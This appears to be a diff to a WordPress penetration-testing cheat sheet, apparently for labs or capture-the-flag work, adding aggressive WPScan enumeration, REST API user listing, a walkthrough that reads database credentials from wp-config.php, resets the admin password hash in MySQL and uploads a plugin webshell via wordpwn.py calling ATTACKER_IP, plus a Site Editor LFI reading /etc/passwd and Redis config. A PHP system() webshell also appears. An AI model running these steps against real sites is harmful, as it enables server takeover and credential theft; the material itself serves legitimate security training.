@@ -19,17 +19,13 @@ curl -s http://TARGET/readme.html
 ## WPScan Enumeration
 
 ```bash
-# Basic scan
-wpscan --url http://TARGET
-
 # Enumerate users, vulnerable plugins, and vulnerable themes in one pass
 wpscan --url http://TARGET -e u,vp,vt
 
-# Enumerate users
-wpscan --url http://TARGET --enumerate u
+# Aggressive enumeration for plugins, users, and themes
+wpscan --url http://TARGET --enumerate p,u,t --plugins-detection aggressive --no-update
+wpscan --url http://TARGET --enumerate ap,u,at --plugins-detection aggressive --no-update
 
-# Enumerate plugins
-wpscan --url http://TARGET --enumerate p
 
 # Enumerate vulnerable plugins
 wpscan --url http://TARGET --enumerate vp
@@ -49,6 +45,12 @@ Useful hits:
 ```text
 http://TARGET/wordpress/wp-content/plugins/adrotate/
 http://TARGET/wordpress/wp-content/plugins/akismet/
+```
+
+WordPress REST API can also expose users:
+
+```text
+http://TARGET/index.php/wp-json/wp/v2/users/
 ```
 
 ---
@@ -81,6 +83,40 @@ system($_GET[0]);
 ```
 
 6. Access: `http://TARGET/wp-content/themes/twentynineteen/404.php?0=id`
+
+---
+
+## Database Admin Password Reset to Plugin Upload
+
+If you have a shell and recover database credentials from `wp-config.php`, use MySQL to reset an existing admin password, then log in and upload a malicious plugin.
+
+```bash
+cat /var/www/html/wp-config.php
+# define( 'DB_USER', 'karl' );
+# define( 'DB_PASSWORD', 'Wordpress1234' );
+# define( 'DB_HOST', 'localhost' );
+
+mysql -u karl -h localhost -p
+```
+
+```sql
+use wordpress;
+select ID,user_login,user_pass from wp_users;
+UPDATE wp_users SET user_pass = '$P$BOsqjHHIL2M2Q.HnZA5JL/xb9FIb5l1' WHERE user_login = 'admin';
+```
+
+The observed hash set the `admin` password to `admin`. After logging in, upload a plugin webshell and trigger it:
+
+```bash
+python3 wordpwn.py ATTACKER_IP 80 N
+```
+
+```text
+http://TARGET/wp-admin/plugin-install.php?tab=upload
+http://TARGET/wp-content/plugins/malicious/SWebTheme.php?cmd=whoami
+```
+
+Successful shell context may be the web server user, such as `alice`.
 
 ---
 
@@ -333,6 +369,31 @@ except:
     else:
         print("likely failed, confirm manually with: curl http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd")
 ```
+
+### Site Editor 1.1.1 LFI (CVE-2018-7422)
+
+WordPress Plugin **Site Editor 1.1.1** exposes an unauthenticated LFI through `ajax_shortcode_pattern.php`.
+
+```bash
+searchsploit wordpress site editor
+searchsploit -m php/webapps/44340.txt
+```
+
+Confirm by reading `/etc/passwd`:
+
+```text
+http://TARGET/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+```
+
+Useful follow-on files:
+
+```text
+/proc/sched_debug
+/proc/mounts
+/etc/redis/redis.conf
+```
+
+`/etc/redis/redis.conf` can expose `requirepass`, which can lead to authenticated Redis RCE.
 
 ### wpDiscuz RCE (CVE-2020-24186)
 
